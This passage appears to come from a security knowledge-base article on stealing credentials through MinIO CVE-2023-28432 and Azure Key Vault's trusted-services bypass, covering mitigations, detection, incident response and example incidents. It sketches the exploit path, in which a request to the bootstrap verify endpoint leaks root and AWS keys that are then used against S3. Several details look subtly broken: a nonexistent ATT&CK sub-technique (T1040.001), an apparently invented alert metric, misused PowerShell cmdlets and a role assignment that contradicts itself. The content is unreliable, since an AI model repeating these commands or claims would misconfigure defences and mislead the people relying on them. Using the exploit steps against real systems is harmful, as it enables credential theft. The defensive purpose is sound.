Search-UnifiedAuditLog -Operations "AzureKeyVaultSecretRetrieval", "AzureKeyVaultKeyRetrieval", "AzureKeyVaultCertificateRetrieval" `
    -StartDate (Get-Date).AddDays(-30) `
    -EndDate (Get-Date) | 
    Select-Object TimeStamp, UserIds, Operations, AuditData

# Parse results
Search-UnifiedAuditLog -Operations "*KeyVault*" -StartDate (Get-Date).AddDays(-7) | 
    ForEach-Object {
        $auditData = $_.AuditData | ConvertFrom-Json
        [PSCustomObject]@{
            TimeStamp = $auditData.CreationTime
            Operation = $auditData.Operation
            User = $auditData.UserId
            Resource = $auditData.ObjectId
            Status = $auditData.ResultStatus
        }
    }
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Mitigation 1.1: Disable Trusted Services Bypass (If Not Required)

**Objective:** Prevent compromised Azure services from accessing Key Vault via firewall bypass

**Applies To:** Azure Key Vault 2016+

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Key Vault**
2. Select **Networking**
3. Under **Firewalls and virtual networks**:
   - Find **Allow trusted Microsoft services to bypass this firewall**
   - Toggle to **OFF** (No)
4. Click **Apply**

**Manual Steps (PowerShell):**

```powershell
# Disable trusted services bypass
Update-AzKeyVaultNetworkRuleSet -VaultName "mykeyvault" `
    -ResourceGroupName "myresourcegroup" `
    -Bypass None

# Verify
(Get-AzKeyVault -VaultName "mykeyvault").NetworkAcls.Bypass
# Should return: None
```

**Manual Steps (Azure CLI):**

```bash
# Disable trusted services bypass
az keyvault update --resource-group myresourcegroup \
    --name mykeyvault \
    --bypass None

# If services need access, use private endpoints instead
```

---

#### Mitigation 1.2: Upgrade MinIO to Patched Version

**Objective:** Patch CVE-2023-28432 vulnerability

**Applies To:** MinIO clusters (all versions before RELEASE.2023-03-20T20-16-18Z)

**Manual Steps:**

```bash
# Check current version
docker exec minio-container minio --version

# Upgrade via Docker Compose
docker-compose down
docker pull minio/minio:RELEASE.2023-03-20T20-16-18Z
# Update docker-compose.yml with new version tag
docker-compose up -d

# Upgrade binary (standalone)
cd /opt/minio
sudo systemctl stop minio
sudo wget https://dl.min.io/server/minio/release/linux-amd64/minio
sudo chmod +x minio
sudo systemctl start minio

# Verify upgrade
curl http://localhost:9000/minio/bootstrap/v1/verify
# Should return 403 or empty response (patched)
```

---

#### Mitigation 1.3: Implement Network Segmentation for MinIO

**Objective:** Restrict network access to MinIO API endpoint

**Applies To:** MinIO clusters in cloud environments

**Manual Steps (Network Security Group / Firewall):**

```bash
# Azure NSG
az network nsg rule create --resource-group myresourcegroup \
    --nsg-name minio-nsg \
    --name "AllowMinIOFromAuthenticatedVNet" \
    --priority 100 \
    --source-address-prefixes VirtualNetwork \
    --source-port-ranges '*' \
    --destination-address-prefixes '*' \
    --destination-port-ranges 9000 9001 \
    --access Allow \
    --protocol Tcp

# Deny all other traffic to MinIO
az network nsg rule create --resource-group myresourcegroup \
    --nsg-name minio-nsg \
    --name "DenyMinIOFromInternet" \
    --priority 200 \
    --source-address-prefixes Internet \
    --destination-port-ranges 9000 9001 \
    --access Deny \
    --protocol Tcp
```

---

#### Mitigation 1.4: Implement Private Endpoints for Key Vault

**Objective:** Remove public internet access, enforce VNet-only access

**Applies To:** Azure Key Vault 2016+

**Manual Steps (Azure Portal):**

1. Navigate to **Key Vault** → **Networking** → **Private endpoint connections**
2. Click **+ Create**
3. Configure:
   - **Name:** `kv-private-endpoint`
   - **Virtual Network:** Select your VNet
   - **Subnet:** Select private subnet
   - **Key Vault Subresources:** `vault`
4. Under **DNS Integration**, select **Yes**
5. Click **Review + create**

**Manual Steps (PowerShell):**

```powershell
# Create private endpoint for Key Vault
$vnet = Get-AzVirtualNetwork -ResourceGroupName "myresourcegroup" -Name "myvnet"
$subnet = Get-AzVirtualNetworkSubnetConfig -Name "privatesubnet" -VirtualNetwork $vnet
$kv = Get-AzKeyVault -VaultName "mykeyvault" -ResourceGroupName "myresourcegroup"

New-AzPrivateEndpointConnection -ResourceGroupName "myresourcegroup" `
    -Name "kv-private-endpoint" `
    -PrivateLinkServiceId $kv.ResourceId `
    -SubnetId $subnet.Id `
    -VirtualNetworkId $vnet.Id
```

---

### Priority 2: HIGH

#### Mitigation 2.1: Implement Azure Network Security Perimeter

**Objective:** Enforce strict network boundaries with NSP rules

**Applies To:** Azure services within a perimeter

**Manual Steps:**

```powershell
# Create Network Security Perimeter
New-AzNetworkSecurityPerimeter -Name "kvperimeter" `
    -ResourceGroupName "myresourcegroup" `
    -Location "eastus"

# Associate Key Vault with NSP
# Add explicit access rules for allowed sources only
```

---

#### Mitigation 2.2: Enable Key Vault Diagnostic Logging

**Objective:** Detect suspicious access patterns

**Applies To:** All Key Vault instances

**Manual Steps (Azure Portal):**

1. Navigate to **Key Vault** → **Diagnostic settings**
2. Click **+ Add diagnostic setting**
3. Configure:
   - **Name:** `kv-audit-logs`
   - **Logs:** `AuditEvent` (check all)
   - **Destination:** Log Analytics Workspace
4. Click **Save**

**Manual Steps (PowerShell):**

```powershell
$kv = Get-AzKeyVault -VaultName "mykeyvault" -ResourceGroupName "myresourcegroup"
$workspace = Get-AzOperationalInsightsWorkspace -ResourceGroupName "myresourcegroup" -Name "myworkspace"

Set-AzDiagnosticSetting -ResourceId $kv.ResourceId `
    -WorkspaceId $workspace.ResourceId `
    -Enabled $true `
    -Category AuditEvent
```

---

#### Mitigation 2.3: Disable Public Access to MinIO

**Objective:** Block internet access, enforce VPN-only access

**Applies To:** MinIO clusters

**Manual Steps:**

```bash
# Configure MinIO with TLS and authentication
minio server --certs-dir /etc/minio/certs \
    http://minio-{1...4}:9000/minio-data-{1...4}

# Use API gateway with IP whitelisting
# Example: Nginx reverse proxy with auth
```

---

#### Mitigation 2.4: Implement Managed Identity Access Control

**Objective:** Restrict Key Vault access to specific managed identities

**Applies To:** Azure Function Apps, App Services with Managed Identity

**Manual Steps (Azure Portal):**

1. Navigate to **Key Vault** → **Access policies**
2. Click **+ Create**
3. Under **Select principal**, find your Function App managed identity
4. Grant minimal necessary permissions:
   - **Secret permissions:** Get (NOT List, Delete)
   - **Key permissions:** Get, Decrypt (NOT Sign)
5. Click **Add**

**Manual Steps (PowerShell):**

```powershell
$functionApp = Get-AzFunctionApp -ResourceGroupName "myresourcegroup" -Name "myapp"
$principalId = $functionApp.Identity.PrincipalId

Set-AzKeyVaultAccessPolicy -VaultName "mykeyvault" `
    -ObjectId $principalId `
    -PermissionsToSecrets Get `
    -PermissionsToKeys Get, Decrypt `
    -BypassObjectIdValidation
```

---

### Priority 3: MEDIUM

#### Mitigation 3.1: Implement Role-Based Access Control (RBAC)

**Objective:** Enforce least privilege access to Key Vault operations

**Applies To:** All Key Vault instances

**Manual Steps:**

```powershell
# Create custom RBAC role for Key Vault readers
$role = Get-AzRoleDefinition -Name "Key Vault Secrets Officer"

# Assign to specific principals
New-AzRoleAssignment -ObjectId $principalId `
    -RoleDefinitionName "Key Vault Secrets Officer" `
    -Scope $kv.ResourceId `
    -Condition "@Resource[Microsoft.KeyVault/vaults/keys/attributes/expires] -lt @Now" `
    -ConditionVersion "2.0"
```

---

#### Mitigation 3.2: Rotate MinIO Credentials Regularly

**Objective:** Limit impact of credential exposure

**Applies To:** MinIO cluster deployments

**Manual Steps:**

```bash
# Rotate MINIO_ROOT_USER and MINIO_ROOT_PASSWORD
# 1. Create new admin user
mc admin user add <alias> newadmin newpassword

# 2. Grant admin permissions
mc admin policy attach <alias> consoleAdmin --user=newadmin

# 3. Remove old admin
mc admin user disable <alias> oldadmin

# 4. Update environment variables and restart cluster
```

---

#### Mitigation 3.3: Monitor and Alert on Key Vault Firewall Changes

**Objective:** Detect unauthorized firewall bypass attempts

**Applies To:** All Key Vault instances

**Manual Steps:**

```powershell
# Create alert rule for firewall changes
$alert = New-AzMetricAlertRuleV2 -Name "KeyVaultFirewallChange" `
    -ResourceGroupName "myresourcegroup" `
    -ResourceType "Microsoft.KeyVault/vaults" `
    -MetricName "FirewallConfigurationChanged" `
    -Operator "GreaterThan" `
    -Threshold 0 `
    -Frequency "PT5M"
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Detection Flow Diagram

```
┌──────────────────────────────────────────────┐
│   Credential Access Threat Detection Flow    │
└──────────────────────────────────────────────┘
           │
     ┌─────┴─────┐
     ▼           ▼
CVE-2023-28432  Key Vault Bypass
(MinIO)         (Trusted Services)
     │           │
     ├─ Network  ├─ Azure Activity
     │  to       │  Logs
     │  9000     │
     │           ├─ Auth Failures
     ├─ HTTP     │
     │  Request  └─ Unusual Access
     │  Analysis    Pattern
     │           
     └─────┬─────┘
           │
      ALERT: Critical
      Credentials Exposed
```

### Incident Response Playbook

**Initial Detection (0-15 minutes):**

1. **Verify Alert Authenticity**
   ```
   - Check if CVE-2023-28432 request matches known POC patterns
   - Confirm MinIO version is vulnerable (< 2023-03-20)
   - Verify network traffic source legitimacy
   ```

2. **Immediate Containment**
   ```powershell
   # Disable MinIO cluster access
   # Block outbound traffic from MinIO host
   # Revoke all MinIO credentials
   
   mc admin user disable <alias> minioadmin
   mc admin user disable <alias> (all_users)
   ```

3. **Determine Scope**
   ```bash
   # Check MinIO access logs for exploitation evidence
   docker logs minio-container | grep "bootstrap/v1/verify"
   
   # Identify what credentials were exposed
   docker inspect minio-container | grep "MINIO_\|AWS_\|AZURE_"
   ```

**Investigation Phase (15-120 minutes):**

1. **Timeline Analysis**
   - When was vulnerable MinIO deployed?
   - When did exploitation likely occur?
   - What credentials are stored in MinIO environment?

2. **Credential Impact Assessment**
   ```bash
   # For each exposed credential, determine:
   # - What resources can be accessed?
   # - What permissions does the credential have?
   # - When was it last rotated?
   
   # AWS credentials example:
   aws sts get-caller-identity
   aws iam list-user-policies --user-name extracted_user
   ```

3. **Evidence Collection**
   ```bash
   # Preserve logs
   docker logs minio-container > /evidence/minio-logs.txt
   
   # Capture network traffic
   tcpdump -i any -n "port 9000" > /evidence/traffic.pcap
   
   # Document environment variables
   docker inspect minio-container > /evidence/container-config.json
   ```

**Eradication Phase (2-6 hours):**

1. **Credential Rotation**
   ```bash
   # Rotate all exposed credentials
   # MinIO
   mc admin user add <alias> newadmin newpassword
   
   # AWS
   aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive
   
   # Azure
   az keyvault secret set --vault-name mykeyvault --name mysecret --value newsecretvalue
   ```

2. **Patch MinIO**
   ```bash
   # Upgrade to patched version
   docker pull minio/minio:RELEASE.2023-03-20T20-16-18Z
   docker-compose up -d
   ```

3. **Network Segmentation**
   ```
   - Restrict MinIO API access to internal networks only
   - Implement firewall rules
   - Deploy WAF with MinIO-specific rules
   ```

**Verification Phase (6-24 hours):**

1. Confirm MinIO upgraded and patched
2. Verify all credentials rotated
3. Review audit logs for suspicious activity post-incident
4. Test firewall rules and network segmentation
5. Update incident ticket with lessons learned

---

## 16. RELATED ATTACK CHAINS

### Related Technique 1: T1526 - Cloud Service Discovery

**Dependency:** Reconnaissance of Azure services → CA-UNSC-021 (credential theft)

**Link:** Attackers enumerate available services (Function Apps, App Services) to identify trusted services that can bypass Key Vault firewall

---

### Related Technique 2: T1580 - Cloud Infrastructure Discovery

**Dependency:** Enumerate cloud resources → Target high-value resources storing secrets

**Link:** Discovery of MinIO clusters, Key Vaults, storage accounts to prioritize attacks

---

### Related Technique 3: T1040.001 - Traffic Sniffing

**Dependency:** SSRF → redirect traffic to internal resources

**Link:** SSRF in web app allows traffic sniffing of Key Vault requests, exposing endpoints and patterns

---

### Related Technique 4: T1087 - Account Discovery

**Dependency:** Extract credentials → Enumerate available accounts and permissions

**Link:** Once credentials extracted, attacker enumerates AWS/Azure accounts to maximize impact

---

## 17. REAL-WORLD EXAMPLES

### Example 1: MinIO CVE-2023-28432 Exploitation in the Wild

**Incident Summary:**
In March 2023, researchers discovered active exploitation of CVE-2023-28432 targeting MinIO clusters hosting Kubernetes backups, database backups, and machine learning model artifacts. Threat actors were systematically scanning for vulnerable MinIO instances and extracting AWS credentials stored in environment variables.

**Attack Steps:**

1. **Reconnaissance:** Network scan for MinIO ports (9000, 9001) across target subnets
2. **Vulnerability Check:** HTTP GET to /minio/bootstrap/v1/verify endpoint
3. **Credential Extraction:** Parse JSON response for MINIO_ROOT_PASSWORD, AWS_SECRET_ACCESS_KEY
4. **Lateral Movement:** Use stolen AWS credentials to access S3 buckets
5. **Data Exfiltration:** Download sensitive backups and data

**Impact:**
- Thousands of MinIO clusters exposed
- Database backups extracted
- Customer data and API keys compromised
- Ransomware operators used credentials to deploy secondary payloads

**Detection Failures:**
- No network segmentation (MinIO accessible from internet)
- No diagnostic logging on MinIO
- Credentials stored in plaintext environment variables
- No version monitoring or automated patching

**Mitigation Applied:**
- MinIO released patch RELEASE.2023-03-20T20-16-18Z
- CISA added CVE-2023-28432 to known exploited vulnerabilities (KEV) catalog
- Splunk and other SIEM vendors released detection rules
- Organizations implemented network segmentation and secrets management

**Reference:** [CISA CVE-2023-28432 Advisory](https://nvd.nist.gov/vuln/detail/CVE-2023-28432)

---

### Example 2: Azure Key Vault Bypass via Compromised Function App (Hypothetical)

**Incident Scenario:**
An organization deployed a Python-based Azure Function App to process user uploads. The function contained an SSRF vulnerability allowing users to specify arbitrary image URLs for processing. When a compromised developer deployed backdoored code, the function's Managed Identity (which had Key Vault access) was leveraged to steal application secrets.

**Attack Chain:**

1. **Initial Compromise:** Developer's laptop infected with malware
2. **Code Modification:** Backdoor deployed to Azure Function App via CI/CD
3. **SSRF Exploitation:** Function processes attacker-supplied URL
4. **Credential Theft:** Function makes request to Key Vault using Managed Identity
5. **Firewall Bypass:** Key Vault firewall allows request (trusted service)
6. **Data Breach:** Database credentials, API keys extracted

**Impact:**
- All application secrets compromised
- Database accessed and exfiltrated
- Third-party API keys stolen
- Lateral movement to SaaS platforms (Salesforce, Jira, GitHub)

**Detection Failures:**
- Trusted services bypass enabled by default (assumption of zero-risk)
- Limited monitoring of Function App outbound requests
- No network controls on Key Vault access
- Secrets not rotated regularly

**Remediation:**
- Disabled trusted services bypass
- Implemented Azure Network Security Perimeter
- Added Azure Policy to enforce private endpoints
- Implemented conditional access requiring device compliance
- Automated credential rotation

---

### Example 3: Ransomware Credential Harvesting via CVE-2023-28432

**Incident Summary:**
Ransomware operators targeting healthcare organizations discovered vulnerable MinIO clusters used for HIPAA backup compliance. They exploited CVE-2023-28432 to extract AWS credentials, then accessed AWS backup repositories to exfiltrate patient data before deploying ransomware.

**Attack Progression:**

1. **Scanning:** Identify MinIO clusters via Shodan/internet scanning
2. **POC Verification:** Confirm vulnerability with test request
3. **Credential Harvesting:** Extract MINIO_ROOT_PASSWORD and AWS keys
4. **AWS Reconnaissance:** List S3 buckets and enumerate backup archives
5. **Data Exfiltration:** Download unencrypted backup files
6. **Encryption Deployment:** Deploy ransomware to encrypt live databases and backups
7. **Extortion:** Demand ransom, threaten to release patient data

**Impact:**
- HIPAA protected health information (PHI) exposed
- Backup and disaster recovery systems compromised
- Operational disruption (inability to restore from backups)
- Significant financial and reputational damage
- Regulatory investigation and penalties

**Lessons Learned:**
- Backups must be stored with independent credentials
- Encryption keys should not be stored alongside encrypted data
- Network segmentation critical for backup infrastructure
- Regular patching essential for internet-exposed systems
- Secrets should never be stored in environment variables
- Automated detection of vulnerable deployments needed

**Reference:** [HealthCare Sector Ransomware Attacks - CISA Advisory](https://www.cisa.gov/healthcare-cybersecurity)

---

## APPENDIX: References & Resources

### Official Documentation
- [NIST CVE-2023-28432 Details](https://nvd.nist.gov/vuln/detail/CVE-2023-28432)
- [MinIO Security Advisory - CVE-2023-28432](https://blog.min.io/security-advisory-stackedcves/)
- [Azure Key Vault Network Security](https://learn.microsoft.com/en-us/azure/key-vault/general/network-security)
- [Azure Key Vault Access Control](https://learn.microsoft.com/en-us/azure/key-vault/general/security-features)
- [MITRE ATT&CK T1552.007 - Container API](https://attack.mitre.org/techniques/T1552/007/)

### Security Research & Tools
- [Tenable - Service Tag Spoofing Research](https://www.tenable.com/blog/these-services-shall-not-pass-abusing-service-tags-to-bypass-azure-firewall-rules)
- [SolarWinds SSRF and Metadata Attack - Resecurity](https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials)
- [Capital One Breach Technical Analysis](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)
- [HackTheCloud - EC2 Metadata SSRF](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/)
- [MinIO Metasploit Module](https://www.exploit-db.com/exploits/50891)

### Compliance & Standards
- **CIS Controls v8:**
  - 6.2 - Secure Credential Storage
  - 13.2 - Centralized Logging
  - 14.6 - Access Control Testing
- **NIST Cybersecurity Framework:**
  - ID.RA-2 - Asset inventory
  - PR.AC-1 - Access control implementation
  - DE.AE-1 - Anomaly detection
- **GDPR Article 32:** Technical and organizational security measures
- **HIPAA Security Rule 164.312(a)(2)(i):** Encryption and decryption mechanisms
- **ISO 27001:2022:**
  - A.9.2 - User access management
  - A.10.1 - Cryptographic controls
  - A.12.4 - Logging

---
